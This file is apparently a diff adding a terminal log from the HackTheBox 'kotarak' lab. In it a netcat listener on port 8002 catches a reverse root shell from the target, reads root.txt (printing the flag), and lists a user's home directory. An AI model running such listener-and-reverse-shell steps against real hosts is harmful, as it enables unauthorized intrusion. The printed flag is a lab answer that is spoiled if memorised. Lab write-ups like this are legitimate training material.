@@ -1,0 +1,36 @@
+┌─[root@parrot]─[~/hackthebox/kotarak]      
+└──╼ #vi exploit.py   
+┌─[root@parrot]─[~/hackthebox/kotarak]      
+└──╼ #nc -nvlp 8002   
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                            
+Ncat: Listening on :::8002                  
+Ncat: Listening on 0.0.0.0:8002             
+Ncat: Connection from 10.10.10.55.          
+Ncat: Connection from 10.10.10.55:50976.    
+/bin/sh: 0: can't access tty; job control turned off                                    
+# id                  
+uid=0(root) gid=0(root) groups=0(root)      
+# ls                  
+root.txt              
+# cat root.txt        
+950d1425795dfd38272c93ccbb63ae2c            
+# whoami              
+root                  
+# hostname            
+kotarak-int           
+# cd /home            
+# ls                  
+ubuntu                
+# cd ubuntu           
+# ls                  
+# ls -la              
+total 28              
+drwxr-xr-x 3 ubuntu ubuntu 4096 Aug 29  2017 .                                          
+drwxr-xr-x 3 root   root   4096 Jul 21  2017 ..                                         
+-rw------- 1 ubuntu ubuntu   41 Sep 19  2017 .bash_history                              
+-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout                               
+-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc                                    
+drwx------ 2 ubuntu ubuntu 4096 Jul 21  2017 .cache                                     
+-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile                                   
+-rw-r--r-- 1 ubuntu ubuntu    0 Jul 19  2017 .sudo_as_admin_successful                  
+#                     
